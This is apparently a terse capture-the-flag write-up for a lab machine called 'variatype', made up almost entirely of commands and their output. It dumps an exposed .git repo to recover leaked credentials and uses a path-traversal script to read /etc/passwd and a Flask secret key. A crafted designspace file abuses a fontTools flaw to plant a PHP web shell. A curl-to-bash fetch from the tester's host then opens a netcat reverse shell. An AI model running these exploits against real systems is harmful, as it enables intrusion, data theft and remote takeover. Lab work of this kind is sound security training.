network recon:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey:
|   256 e0:b2:eb:88:e3:6a:dd:4c:db:c1:38:65:46:b5:3a:1e (ECDSA)
|_  256 ee:d2:bb:81:4d:a2:8f:df:1c:50:bc:e1:0e:0a:d1:22 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-title: Did not follow redirect to http://variatype.htb/
|_http-server-header: nginx/1.22.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

i find .git exposed:

```
ajdev@rootbox:~$ curl -s http://portal.variatype.htb/.git/HEAD
ref: refs/heads/master

then:

~$ pip3 install git-dumper --break-system-packages

ajdev@rootbox:~/repo$ ls
auth.php
ajdev@rootbox:~/repo$ ls -la
total 16
drwxrwxr-x  3 ajdev ajdev 4096 Mar 15 14:31 .
drwxr-x--- 42 ajdev ajdev 4096 Mar 15 14:31 ..
-rw-rw-r--  1 ajdev ajdev   36 Mar 15 14:31 auth.php
drwxrwxr-x  7 ajdev ajdev 4096 Mar 15 14:31 .git
ajdev@rootbox:~/repo$ git log --oneline --all
753b5f5 (HEAD -> master) fix: add gitbot user for automated validation pipeline
5030e79 feat: initial portal implementation
ajdev@rootbox:~/repo$ git diff HEAD~1 HEAD
diff --git a/auth.php b/auth.php
index 615e621..b328305 100644
--- a/auth.php
+++ b/auth.php
@@ -1,3 +1,5 @@
 <?php
 session_start();
-$USERS = [];
+$USERS = [
+    'gitbot' => 'G1tB0t_Acc3ss_2025!'
+];
```

found subdomain:

```
portal.variatype.htb
```

login with that and redirect to:

```
http://portal.variatype.htb/dashboard.php
```

then:

``` 
#!/usr/bin/env python3
import sys
import requests


BASE_URL = "http://portal.variatype.htb"
USERNAME = "gitbot"
PASSWORD = "G1tB0t_Acc3ss_2025!"
TRAVERSAL = "....//" * 5


if len(sys.argv) != 2:
    print(f"usage: python {sys.argv[0]} /etc/passwd")
    sys.exit(1)

path = sys.argv[1].lstrip("/")

s = requests.Session()
s.post(f"{BASE_URL}/", data={"username": USERNAME, "password": PASSWORD})
r = s.get(f"{BASE_URL}/download.php", params={"f": TRAVERSAL + path})

print(r.text)
```

then:

```
ajdev@rootbox:~/HTB$ python3 solve.py /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
steve:x:1000:1000:steve,,,:/home/steve:/bin/bash
variatype:x:102:110::/nonexistent:/usr/sbin/nologin
_laurel:x:999:996::/var/log/laurel:/bin/false
```

```
ajdev@rootbox:~/HTB$ python3 solve.py /etc/nginx/sites-enabled/portal.variatype.htb
server {
    listen 80;
    server_name portal.variatype.htb;

    root /var/www/portal.variatype.htb/public;
    index index.php;

    access_log /var/log/nginx/portal_access.log;
    error_log /var/log/nginx/portal_error.log;

    location / {
        try_files $uri $uri/ =404;
    }

    location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/run/php/php-fpm.sock;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
        include fastcgi_params;
    }

    location /files/ {
        autoindex off;
    }
}

ajdev@rootbox:~/HTB$ python3 solve.py /opt/variatype/app.py
import os
import tempfile
import subprocess
import shutil
import secrets
from flask import Flask, render_template, request, redirect, url_for, flash, send_file

app = Flask(__name__)
app.secret_key = '7e052f614c5f9d5da3249cc4c6d9a950053aed370b8464d2e8a81d41ff0e3371'

UPLOAD_FOLDER = '/tmp/variabype_uploads'
DOWNLOAD_FOLDER = '/var/www/portal.variatype.htb/public/files'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(DOWNLOAD_FOLDER, exist_ok=True)

@app.route('/')
def home():
    return render_template('home.html')

@app.route('/services')
def services():
    return render_template('services.html')

@app.route('/tools/variable-font-generator')
def variable_font_generator():
    return render_template('tools/variable_font_generator.html')

@app.route('/tools/variable-font-generator/process', methods=['POST'])
def process_variable_font():
    designspace = request.files.get('designspace')
    master_fonts = request.files.getlist('masters')

    if not designspace or not master_fonts:
        flash('Please upload a .designspace file and at least one master font (.ttf/.otf).', 'error')
        return redirect(url_for('variable_font_generator'))

    if not designspace.filename.endswith('.designspace'):
        flash('The main file must be a valid .designspace document.', 'error')
        return redirect(url_for('variable_font_generator'))

    unique_id = secrets.token_urlsafe(8)
    download_filename = f"variabype_{unique_id}.ttf"
    download_path = os.path.join(DOWNLOAD_FOLDER, download_filename)

    with tempfile.TemporaryDirectory(dir=UPLOAD_FOLDER) as workdir:
        ds_path = os.path.join(workdir, 'config.designspace')
        designspace.save(ds_path)

        for font in master_fonts:
            if font.filename.endswith(('.ttf', '.otf')):
                font.save(os.path.join(workdir, font.filename))
            else:
                flash('Only .ttf and .otf master fonts are supported.', 'error')
                return redirect(url_for('variable_font_generator'))

        try:
            subprocess.run(
                ['fonttools', 'varLib', 'config.designspace'],
                cwd=workdir,
                check=True,
                timeout=30
            )

            output_file = None
            for f in os.listdir(workdir):
                if f != 'config.designspace' and not f.startswith('.'):
                    output_file = f
                    break

            if output_file:
                shutil.copy2(os.path.join(workdir, output_file), download_path)

            return render_template('tools/success.html', download_id=unique_id)

        except subprocess.TimeoutExpired:
            flash('Font generation timed out.', 'error')
            return redirect(url_for('variable_font_generator'))
        except subprocess.CalledProcessError:
            flash('Font generation failed during processing.', 'error')
            return redirect(url_for('variable_font_generator'))
        except Exception:
            flash('An unexpected error occurred.', 'error')
            return redirect(url_for('variable_font_generator'))

@app.route('/download/<download_id>')
def download_file(download_id):
    if not download_id.replace('_', '').replace('-', '').isalnum():
        flash('Invalid download ID.', 'error')
        return redirect(url_for('variable_font_generator'))

    filename = f"variabype_{download_id}.ttf"
    path = os.path.join(DOWNLOAD_FOLDER, filename)

    if os.path.exists(path):
        user_filename = f"MyVariableFont_{download_id}.ttf"
        return send_file(path, as_attachment=True, download_name=user_filename)
    else:
        flash('File not available for download.', 'error')
        return redirect(url_for('variable_font_generator'))
if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000, debug=False)
```


found secret key from app.py `7e052f614c5f9d5da3249cc4c6d9a950053aed370b8464d2e8a81d41ff0e3371`

#CVE-2025-66034 

```
ajdev@rootbox:~/HTB$ python3 << 'EOF'
from fontTools.fontBuilder import FontBuilder
from fontTools.pens.ttGlyphPen import TTGlyphPen

def make_font(path, family, weight):
    fb = FontBuilder(1000, isTTF=True)
    fb.setupGlyphOrder([".notdef"])
    fb.setupCharacterMap({})
    pen = TTGlyphPen(None)
    pen.moveTo((0, 0))
    pen.lineTo((500, 0))
    pen.lineTo((500, 700))
    pen.lineTo((0, 700))
    pen.closePath()
    fb.setupGlyf({".notdef": pen.glyph()})
    fb.setupHorizontalMetrics({".notdef": (500, 0)})
    fb.setupHorizontalHeader(ascent=800, descent=-200)
    fb.setupNameTable({"familyName": family, "styleName": "Regular"})
    fb.setupOS2(weightClass=weight)
    fb.setupPost()
    fb.setupHead(unitsPerEm=1000)
    fb.font.save(path)
    print(f"Created {path}")

make_font("light.ttf", "Test", 100)
make_font("bold.ttf", "Test", 900)
EOF
Created light.ttf
Created bold.ttf
```

```
ajdev@rootbox:~/HTB$ cat > malicious.designspace << 'EOF'
<?xml version='1.0' encoding='UTF-8'?>
<designspace format="5.0">
  <axes>
    <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
      <labelname xml:lang="en"><![CDATA[<?php system($_GET['x']); ?>]]]]><![CDATA[>]]></labelname>
    </axis>
  </axes>
  <sources>
    <source filename="source-light.ttf" name="Light">
      <location>
        <dimension name="Weight" xvalue="100"/>
      </location>
    </source>
    <source filename="source-regular.ttf" name="Regular">
      <location>
        <dimension name="Weight" xvalue="400"/>
      </location>
    </source>
  </sources>
  <variable-fonts>
    <variable-font name="MyFont" filename="/var/www/portal.variatype.htb/public/files/glyph-check.php">
      <axis-subsets>
        <axis-subset name="Weight"/>
      </axis-subsets>
    </variable-font>
  </variable-fonts>
</designspace>
EOF
ajdev@rootbox:~/HTB$ ~/.local/bin/fonttools varLib malicious.designspace 2>&1
Axes:
[{'axisLabels': [],
  'axisOrdering': None,
  'default': 400.0,
  'hidden': False,
  'labelNames': {'en': "<?php system($_GET['x']); ?>]]>"},
  'map': [],
  'maximum': 900.0,
  'minimum': 100.0,
  'name': 'Weight',
  'tag': 'wght'}]
Internal master locations:
[{'Weight': 100.0}, {'Weight': 400.0}]
Internal axis supports:
{'Weight': [100.0, 400.0, 900.0]}
Normalized master locations:
[{'Weight': -1.0}, {'Weight': 0.0}]
Index of base master: 1
Building variable font
Loading master fonts
WARNING: 'created' timestamp seems very low; regarding as unix timestamp
WARNING: 'modified' timestamp seems very low; regarding as unix timestamp
WARNING: 'created' timestamp seems very low; regarding as unix timestamp
WARNING: 'modified' timestamp seems very low; regarding as unix timestamp
WARNING: 'created' timestamp seems very low; regarding as unix timestamp
WARNING: 'modified' timestamp seems very low; regarding as unix timestamp
Generating fvar
Building variations tables
Generating avar
No need for avar
Generating MVAR
Generating HVAR
Generating gvar
Merging TT hinting
Saving variation font glyph-check.php
ajdev@rootbox:~/HTB$ strings glyph-check.php | grep php
@TestRegular<?php system($_GET['x']); ?>]]>
ajdev@rootbox:~/HTB$ curl -s -X POST http://variatype.htb/tools/variable-font-generator/process \
  -F "designspace=@malicious.designspace" \
  -F "masters=@source-light.ttf" \
  -F "masters=@source-regular.ttf" \
  -v 2>&1 | grep -E "HTTP|Location|error"

curl -s "http://portal.variatype.htb/files/glyph-check.php?x=id"
> POST /tools/variable-font-generator/process HTTP/1.1
< HTTP/1.1 200 OK
```

then i got the shell:

```
ajdev@rootbox:~$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.129.8.177 - - [15/Mar/2026 15:20:43] "GET /rev.sh HTTP/1.1" 200 -

~$ curl -s "http://portal.variatype.htb/files/glyph-check.php?x=curl+10.10.15.156:8080/rev.sh|bash"

ajdev@rootbox:~$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.8.177 33432
bash: cannot set terminal process group (3400): Inappropriate ioctl for device
bash: no job control in this shell
www-data@variatype:~/portal.variatype.htb/public/files$ 
```

```
www-data@variatype:/opt$ ls
ls
font-tools
process_client_submissions.bak
variatype
www-data@variatype:/opt$ file process*
file process*
process_client_submissions.bak: Bourne-Again shell script, ASCII text executable
www-data@variatype:/opt$
```